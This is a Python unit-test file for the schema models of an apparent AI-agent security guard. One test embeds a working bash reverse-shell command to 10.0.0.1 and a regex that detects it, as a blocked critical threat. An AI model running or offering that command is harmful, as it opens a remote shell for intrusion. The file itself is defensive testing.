"""Unit tests for aegis.core.schema models."""

from datetime import datetime

import pytest
from pydantic import ValidationError

from aegis.core.schema import (
    ActionDecision,
    AgentEvent,
    ExtractedArtifacts,
    ThreatMatch,
    ThreatSeverity,
    TierSource,
    Verdict,
)


def test_threat_severity_values() -> None:
    """Verify that all expected ThreatSeverity enum values exist and match specifications."""
    expected_values = {
        "critical": ThreatSeverity.CRITICAL,
        "high": ThreatSeverity.HIGH,
        "medium": ThreatSeverity.MEDIUM,
        "low": ThreatSeverity.LOW,
        "info": ThreatSeverity.INFO,
    }
    for val_str, enum_val in expected_values.items():
        assert ThreatSeverity(val_str) == enum_val
    assert len(ThreatSeverity) == 5


def test_action_decision_values() -> None:
    """Verify that all expected ActionDecision enum values exist and match specifications."""
    expected_values = {
        "allow": ActionDecision.ALLOW,
        "block": ActionDecision.BLOCK,
        "ask": ActionDecision.ASK,
        "sanitize": ActionDecision.SANITIZE,
    }
    for val_str, enum_val in expected_values.items():
        assert ActionDecision(val_str) == enum_val
    assert len(ActionDecision) == 4


def test_extracted_artifacts_defaults() -> None:
    """Verify that an empty ExtractedArtifacts instance initializes with empty lists."""
    artifacts = ExtractedArtifacts()
    assert artifacts.commands == []
    assert artifacts.file_paths == []
    assert artifacts.urls == []
    assert artifacts.secrets == []
    assert artifacts.untrusted_data_markers == []


def test_agent_event_creation() -> None:
    """Verify that AgentEvent correctly initializes and stores all supplied fields."""
    event = AgentEvent(
        session_id="sess_abc123",
        step_number=1,
        user_intent="List all temporary directory files",
        tool_name="execute_command",
        tool_input={"command": "ls -la /tmp"},
        llm_reasoning="I need to inspect the contents of /tmp for suspicious scripts.",
        artifacts=ExtractedArtifacts(
            commands=["ls -la /tmp"],
            file_paths=["/tmp"],
        ),
    )

    assert event.session_id == "sess_abc123"
    assert event.step_number == 1
    assert event.user_intent == "List all temporary directory files"
    assert event.tool_name == "execute_command"
    assert event.tool_input == {"command": "ls -la /tmp"}
    assert event.llm_reasoning == "I need to inspect the contents of /tmp for suspicious scripts."
    assert event.artifacts.commands == ["ls -la /tmp"]
    assert event.artifacts.file_paths == ["/tmp"]
    assert isinstance(event.timestamp, datetime)


def test_verdict_confidence_bounds() -> None:
    """Verify that confidence scores outside the [0.0, 1.0] range raise Pydantic ValidationError."""
    # Confidence < 0.0 must raise ValidationError
    with pytest.raises(ValidationError):
        Verdict(
            decision=ActionDecision.ALLOW,
            confidence=-0.1,
            tier_source=TierSource.TIER1_HEURISTICS,
            reason="Confidence below zero should fail validation",
            latency_ms=1.0,
        )

    # Confidence > 1.0 must raise ValidationError
    with pytest.raises(ValidationError):
        Verdict(
            decision=ActionDecision.ALLOW,
            confidence=1.05,
            tier_source=TierSource.TIER1_HEURISTICS,
            reason="Confidence above one should fail validation",
            latency_ms=1.0,
        )

    # Valid boundaries [0.0, 1.0] must succeed
    v_zero = Verdict(
        decision=ActionDecision.ALLOW,
        confidence=0.0,
        tier_source=TierSource.TIER1_HEURISTICS,
        reason="Lower bound valid",
        latency_ms=0.5,
    )
    assert v_zero.confidence == 0.0

    v_one = Verdict(
        decision=ActionDecision.BLOCK,
        confidence=1.0,
        tier_source=TierSource.TIER1_HEURISTICS,
        reason="Upper bound valid",
        latency_ms=0.5,
    )
    assert v_one.confidence == 1.0


def test_verdict_full_creation() -> None:
    """Verify complete Verdict instantiation with ThreatMatch and JSON serialization."""
    threat = ThreatMatch(
        rule_id="ADR-CMD-001",
        rule_name="Reverse Shell Execution",
        category="command_execution",
        severity=ThreatSeverity.CRITICAL,
        matched_pattern=r"bash\s+-i\s+>&\s*/dev/tcp/",
        matched_content="bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
        mitre_atlas_id="AML.T0051",
    )

    verdict = Verdict(
        decision=ActionDecision.BLOCK,
        confidence=0.99,
        tier_source=TierSource.TIER1_HEURISTICS,
        threats=[threat],
        reason="Reverse shell pattern detected in shell command tool invocation.",
        remediation="Ensure remote access occurs via authorized SSH bastion tunnels.",
        latency_ms=2.34,
    )

    assert verdict.decision == ActionDecision.BLOCK
    assert verdict.confidence == 0.99
    assert verdict.tier_source == TierSource.TIER1_HEURISTICS
    assert len(verdict.threats) == 1
    assert verdict.threats[0].rule_id == "ADR-CMD-001"
    assert verdict.threats[0].severity == ThreatSeverity.CRITICAL
    assert verdict.latency_ms == 2.34

    # Test JSON serialization and round-trip parsing
    json_str = verdict.model_dump_json()
    assert "ADR-CMD-001" in json_str
    assert "Reverse Shell Execution" in json_str
    assert "critical" in json_str

    reconstructed = Verdict.model_validate_json(json_str)
    assert reconstructed.decision == verdict.decision
    assert reconstructed.threats[0].rule_id == "ADR-CMD-001"
